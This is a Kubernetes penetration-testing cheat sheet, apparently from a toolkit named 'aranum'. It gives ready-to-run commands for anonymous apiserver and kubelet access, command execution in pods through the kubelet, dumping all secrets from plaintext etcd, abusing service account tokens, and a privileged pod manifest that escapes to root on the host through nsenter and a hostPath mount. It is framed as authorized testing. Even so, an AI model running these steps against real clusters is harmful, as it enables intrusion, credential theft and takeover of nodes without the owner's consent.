---
service: kubernetes
title: Kubernetes
ports: 6443, 8080, 10250, 10255, 2379, 2380
aliases: k8s, kube, kubectl, kube-apiserver, kubelet, etcd
---

# Kubernetes — quick wins

**When you see it:** 6443/tcp open (kube-apiserver, TLS) or 8080/tcp open (legacy
insecure apiserver, pre-1.20) or 10250/tcp (kubelet) — probe each independently.
Anonymous access to any of these ports is a critical misconfiguration.

> Authorized testing only. Triage is read-only; steps marked ✏️ create pods, extract
> secrets, or execute code — confirm scope and clean up created resources afterwards.

## Triage (read-only)
```sh
# kube-apiserver — anonymous access check
curl -sk https://H:6443/version                    # returns {"major":"1",...} if open
curl -sk https://H:6443/api/v1/pods                # 200 = anonymous read, 403/401 = auth required
# Legacy insecure apiserver (pre-1.20, HTTP no auth):
curl -s http://H:8080/api/v1/namespaces

# kubelet — list all pods on the node
curl -sk https://H:10250/pods | python3 -m json.tool | grep '"name"'
# kubelet read-only (10255, no auth, metrics/pods only):
curl -s http://H:10255/pods

# etcd — check if TLS is required
curl -sk https://H:2379/version
curl -s http://H:2379/version                      # plaintext etcd (misconfigured)

# Run kube-hunter for broad surface map (passive unless --active):
docker run -it --rm aquasec/kube-hunter --remote H
```

## Quick wins

### Anonymous kubectl — full cluster enum
```sh
kubectl --server=https://H:6443 --insecure-skip-tls-verify \
  --username="" --password="" get nodes,pods,svc,secrets -A
# Shorthand if anonymous auth returns results:
kubectl --server=https://H:6443 -k auth can-i --list --as=system:anonymous
```
*Why:* if `system:anonymous` has any RBAC bindings (common on misconfigured clusters or
pre-1.20 installs with `--anonymous-auth=true`), you get the full resource picture
without credentials.

### kubelet unauthenticated exec ✏️
```sh
# List pods on the node:
curl -sk https://H:10250/pods | python3 -m json.tool | \
  python3 -c "import sys,json; [print(p['metadata']['namespace'],p['metadata']['name'],
  p['spec']['containers'][0]['name']) for p in json.load(sys.stdin)['items']]"

# Execute command in a pod (replace NS, POD, CTR with values from above):
curl -sk https://H:10250/run/NS/POD/CTR -d "cmd=id"
# Or use kubeletctl (handles streaming properly):
kubeletctl --server H exec "id" -n NS -p POD -c CTR
```
*Why:* kubelet with `--anonymous-auth=true` and `--authorization-mode=AlwaysAllow`
(cluster-created nodes sometimes ship this way) allows direct command execution in any
pod on that node without any credentials.

### etcd unauthenticated dump → extract all secrets ✏️
```sh
# Dump all keys (plaintext etcd):
ETCDCTL_API=3 etcdctl --endpoints=http://H:2379 get / --prefix --keys-only | head -50
# Pull all Kubernetes secrets (base64-encoded values):
ETCDCTL_API=3 etcdctl --endpoints=http://H:2379 get /registry/secrets --prefix \
  | strings | grep -A 5 "password\|token\|secret"
# TLS etcd without client cert enforcement:
ETCDCTL_API=3 etcdctl --endpoints=https://H:2379 \
  --insecure-skip-tls-verify get /registry/secrets --prefix
```
*Why:* etcd stores the entire cluster state in plaintext — every Kubernetes Secret,
ServiceAccount token, and kubeconfig is directly readable. No RBAC applies; etcd access
bypasses the API server entirely.

### Service account token abuse ✏️
```sh
# From inside a compromised pod — extract the auto-mounted token:
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
# Use it against the API server:
kubectl --server=https://kubernetes.default.svc --token="$TOKEN" \
  --certificate-authority=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  auth can-i --list
# From outside — if you extracted a token via kubelet or etcd:
kubectl --server=https://H:6443 --insecure-skip-tls-verify \
  --token="EXTRACTED_TOKEN" get secrets -A
```
*Why:* every pod gets a ServiceAccount token by default; many clusters bind
`cluster-admin` to the default SA (especially Helm-installed apps), giving full cluster
control from any compromised pod.

### Kubernetes dashboard — anonymous access ✏️
```sh
# Dashboard typically accessible via NodePort or kubectl proxy:
curl -sk https://H:NODEPORT/api/v1/namespaces/kubernetes-dashboard/services/\
https:kubernetes-dashboard:/proxy/
# Or via kubectl proxy (if you have a token):
kubectl proxy --port=8001 &
curl http://127.0.0.1:8001/api/v1/namespaces/kubernetes-dashboard/services/\
https:kubernetes-dashboard:/proxy/
# Skip login button check — some versions allow "Skip" for token-less access.
```
*Why:* the Kubernetes dashboard with anonymous access or "skip" enabled gives a GUI over
the full cluster API — create pods, exec into containers, and read secrets from the browser.

### Privileged pod escape to host ✏️
```sh
# If you can create pods (anonymous or via captured token):
kubectl --server=https://H:6443 -k apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: hostmount
  namespace: default
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: shell
    image: alpine
    command: ["nsenter", "--mount=/proc/1/ns/mnt", "--", "sh"]
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host
  volumes:
  - name: host
    hostPath:
      path: /
EOF
kubectl --server=https://H:6443 -k exec -it hostmount -- chroot /host sh
```
*Why:* a privileged pod with `hostPID` and the host `/` mounted uses `nsenter` to enter
the host mount namespace — equivalent to root on the underlying node.

## aranum helpers
- `aranumtoolkit/network/enum-kubernetes.sh` — produced this finding; probes apiserver,
  kubelet, etcd, and runs kube-hunter passive mode.
- `aranumtoolkit/network/enum-etcd.sh` — dedicated etcd enumeration (key dump,
  membership, version).

## Gotchas
- 6443 returning 401/403 does not mean anonymous access is off — check `can-i --list
  --as=system:anonymous` explicitly; RBAC misconfigs sometimes grant resources to
  unauthenticated users via `ClusterRoleBinding` to `system:unauthenticated`.
- kubelet on 10250 requires HTTPS even when `--anonymous-auth=true`; always use `-k` /
  `--insecure` with curl — the self-signed cert will otherwise reject the connection.
- Port 10255 (read-only kubelet) has been removed in Kubernetes 1.22+ but is present on
  older managed clusters (GKE, AKS, EKS older node groups).
- The insecure apiserver on 8080 was removed in Kubernetes 1.20 — only found on
  on-premise installs running pre-1.20.
- etcd in managed cloud clusters (GKE, EKS, AKS) is not network-accessible from outside
  the control plane — focus on apiserver and kubelet in those environments.
- Clean up created pods (`kubectl delete pod hostmount`) immediately after testing; stray
  privileged pods on production clusters are a serious incident trigger.

## Sources
- HackTricks Cloud "Pentesting Kubernetes Services"; Hackviser Kubernetes API Pentesting;
  CloudSecDocs Kubelet Exploit; HackingDream Kubernetes Penetration Testing Guide 2026;
  aquasecurity/kube-hunter documentation.
